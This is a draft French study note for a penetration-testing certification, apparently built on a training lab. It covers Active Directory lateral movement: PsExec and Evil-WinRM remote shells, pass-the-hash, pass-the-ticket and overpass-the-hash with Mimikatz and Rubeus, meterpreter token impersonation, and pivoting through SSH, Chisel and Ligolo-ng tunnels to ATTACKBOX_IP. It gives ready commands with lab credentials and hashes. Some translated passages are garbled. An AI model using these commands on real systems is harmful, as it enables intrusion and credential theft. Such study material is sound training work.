---
title: Mouvement lateral
date: 2026-07-26
draft: true
tags:
  - pentest
  - Active Directory
  - Responder
  - CPTS
categories:
  - CPTS
  - pentester
  - AD
summary: ""
showToc: true
tocOpen: true
---
Les trois piliers du mouvement latéral

Exécution à distance

Il s'agit de la forme la plus directe de déplacement latéral : l'exécution de commandes sur un hôte distant à l'aide des protocoles d'administration Windows légitimes. 

Réutilisation des identifiants

C'est là que ça devient intéressant. Dans un flux d'authentification standard, vous fournissez un mot de passe et le système le hache pour vérifier votre identité.

Pivotement

Les réseaux réels sont segmentés. Le VLAN serveur, le réseau de gestion et leDCLes sous-réseaux se situent souvent sur des segments de réseau inaccessibles directement depuis votre point d'entrée initial. 

La boîte à outils

[[impacket]]
[[ssh]]
[[Evil-WinRM]]
[[NetExec]] (nxc)


## Exécution a distance 

La forme la plus directe de déplacement latéral consiste à exécuter des commandes sur un hôte distant en utilisant les protocoles d'administration Windows légitimes.

### PsExec  

PsExec est sans doute la technique de déplacement latéral la plus connue. Impacket psexec.py se connecte à une cible via SMB, télécharge un binaire de service, crée et démarre un service Windows pour l'exécuter et renvoie un shell interactif, le tout s'exécutant en tant que NT AUTHORITY\SYSTEM.
Avant d'exécuter PsExec, il est toujours recommandé de vérifier que nous disposons bien des droits d'administrateur sur la cible.

```
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
```


```
psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61

ou 

impacket-psexec thm.loc/jdoe:'Summer2026!'@192.168.13.61    
```

### Evil-WinRM
La gestion à distance Windows (WinRM) est un protocole Microsoft qui permet d'accéder à distance à un shell via HTTP (port 5985) ou HTTPS (port 5986). C'est le protocole utilisé en interne par PowerShell Remoting, et il est activé par défaut sur les systèmes d'exploitation Windows Server.

il existe deux différences clés entre Evil-WinRM et PsExec :

Contexte de l'interpréteur de commandes : les sessions WinRM s'exécutent en tant qu'utilisateur authentifié , et non en tant que SYSTEM. Vous bénéficiez des privilèges du compte avec lequel vous vous êtes authentifié.
Exigences du groupe : le compte doit être membre du groupe BUILTIN\Administrators ou BUILTIN\Remote Management Users du système sur l’hôte cible. Cela rend WinRM légèrement plus flexible que PsExec, qui exige impérativement un accès administrateur au ADMIN$partage.

Connectons-nous au SERVEUR1 en utilisant Evil-WinRMD

```
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
```

> Remarque : Evil-WinRM prend également en charge l’authentification par hachage à l’aide de l’ -Hoption : evil-winrm -i TARGET -u Administrator -H NTLM_HASH. Cela en fait un outil idéal pour les attaques Pass-the-Hash, que nous utiliserons dans la prochaine tâche.

## Réutilisation des identifiants

Recherche d'accès administrateur avec NetExec

Avant de tenter d'obtenir un shell, vérifions quels hôtes du réseau acceptent ce hachage. NetExec peut diffuser un hachage sur plusieurs cibles et nous indiquer où nous disposons d'un accès administrateur :

```
nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H fa....12 --local-auth
```

Obtenir un Shell avec Pass-the-Hash

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fa.....12 Administrator@192.168.13.51
```

Pass-the-Ticket (PtT)

Au lieu de transmettre un hachage, vous injectez un ticket Kerberos volé (TGT ou ticket de service) dans votre session. Ceci est utile lorsque l'authentification NTLM est restreinte mais que Kerberos reste disponible. 

```
 Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

Overpass-the-Hash (Pass-the-Key)

Cette technique fait le lien entre NTLM etKerberosVous utilisez un hachage NT pour demander une requête légitimeKerberosTGT du Centre de distribution de clés, convertissant ainsi un hachage en ticket. La session résultante possède une session valide.Kerberosbillet et accèsKerberos-uniquement les services

```
mimikatz # sekurlsa::pth /user:Administrator /domain:thm.loc /ntlm:fa0.....12 /run:cmd.exe
```

Token Impersonation

Si vous disposez déjà d'un accès SYSTEM sur un hôte (par exemple, via PsExec), vous pouvez voler le jeton d'accès de n'importe quel autre utilisateur connecté. Aucune information d'identification ni hachage n'est requis : il vous suffit d'usurper son identité.

```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "THM\\Administrator"
```



# Pivot 

 Comprendre le transfert de ports

Avant de commencer le tunnelage, comprenons les deux types de redirection de port SSH que nous utiliserons :

La redirection de port locale ( ssh -L) ouvre un port sur votre machine locale (l'AttackBox) et redirige tout le trafic qu'elle reçoit via leSSHIl s'agit d'une connexion à un hôte et un port spécifiques sur le réseau distant. Imaginez un tuyau dédié : une extrémité se trouve sur votre machine, l'autre est accessible via le réseau interne et se connecte à un service spécifique.

La redirection de port dynamiquessh -D offre une plus grande flexibilité. Au lieu de rediriger le trafic vers une destination unique, elle configure un proxy SOCKS sur votre machine locale. Tout outil compatible SOCKS (ou utilisant ProxyChains) peut acheminer le trafic via ce proxy, qui apparaîtra sur le réseau interne. Vous pouvez ainsi accéder à n'importe quel hôte et n'importe quel port via un tunnel unique, et non plus seulement à une destination prédéfinie.

Mises en garde importantes concernant l'utilisation de ProxyChains

- ProxyChains ne gère que le trafic TCP . Les paquets UDP et ICMP sont ignorés silencieusement. Cela signifie nmap -sU(UDP(scan) et pingne fonctionnera pas à travers le tunnel.
- Utilisez toujours nmap -sT l'analyse de connexion TCP (TCP Connect Scan), et non -sS l'analyse SYN (SYN Scan). Les analyses SYN nécessitent des sockets brutes, qui ne peuvent pas être routées via SOCKS.
- Ajoutez toujours l' -Pn option `--ignore` à vos commandes Nmap pour ignorer la découverte des hôtes (qui utilise ICMP). Sans cette option, Nmap considérera que les hôtes sont hors service puisque les pings échouent.
- Le DNS peut présenter des fuites. Par défaut, ProxyChains peut résoudre les noms d'hôtes localement avant d'envoyer le trafic via le proxy.

Chisel

Chisel est un tunnel TCP portable à binaire unique fonctionnant via HTTP.Cette méthode est particulièrement utile lorsque SSH n'est pas disponible, par exemple lorsque votre hôte pivot est une machine Windows sans OpenSSH. Vous exécutez un serveur Chisel sur votre AttackBox et un client Chisel sur l'hôte compromis, ce qui crée un tunnel SOCKS inversé via HTTP.

```
chisel server --port 8080 --reverse
```

```
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

Cela vous offre le même 127.0.0.1 1080proxy socks4 que celui fourni par le transfert dynamique SSH, mais il utilise le protocole HTTP, ce qui signifie qu'il peut traverser les pare-feu qui n'autorisent que le trafic web sortant.

Ligolo-ng

Un outil de pivotement moderne qui adopte une approche totalement différente. Au lieu d'un proxy SOCKS, Ligolo-ng(ouvre dans un nouvel onglet)crée une interface réseau TUN virtuelle sur votre AttackBox. Le trafic envoyé à cette interface est acheminé via l'hôte compromis et émerge sur le réseau interne. 

```
user@attackbox:~$ sudo ./proxy -selfcert

user@pivot:~$ ./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT

user@attackbox:~$ sudo ip route add 192.168.13.0/24 dev ligolo
user@attackbox:~$ nxc smb 192.168.13.0/24 -u jdoe -p 'Summer2026!'
```




ssh Dynamique 

```
 ssh -f -D 1081 jdoe@192.168.13.71 -N  
 
proxychains impacket-psexec -hashes :2508e1ce9cfcfe1011a74c34297b05ea Administrator@192.168.13.100
```